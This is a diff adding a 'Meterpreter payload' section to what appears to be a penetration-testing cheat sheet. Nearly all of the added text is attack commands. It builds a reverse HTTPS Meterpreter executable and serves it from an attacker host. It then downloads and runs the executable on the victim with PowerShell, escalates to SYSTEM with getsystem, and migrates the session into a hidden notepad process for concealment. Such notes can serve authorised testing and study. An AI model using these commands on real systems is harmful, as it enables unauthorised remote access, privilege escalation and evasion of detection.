@@ -80,6 +80,32 @@ $ msfconsole
 PS > ./stage.exe # Ok
 ```
 
-## 
+## Meterpreter payload
+
+```
+$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=AttIP LPORT=AttPort -f exe -o met.exe
+$ python3 -m http.server 80
+msf > set payload windows/x64/meterpreter_reverse_https
+msf > set LPORT 443 # LHOST set before... /!\
+msf > run
+$ nc VictimIp 4444
+cmd> powershell
+PS > iwr -uri http://AttIp/met.exe -outfile met.exe
+PS > ./met.exe
+meterpreter > idletime
+meterpreter > shell
+shell > whoami /priv # SeImpersonatePrivilege activated ???
+shell > exit
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > getuid # rights escalated +++
+meterpreter > ps # get met.exe PID
+meterpreter > migrate somepidtohidthemeterpreter
+meterpreter > execute -H -f notepad # Hide the meterpreter in notepad
+meterpreter > migrate notepadpid
+meterpreter > getenv someenvvar
+```
+
+## Post-exploitation
 
 
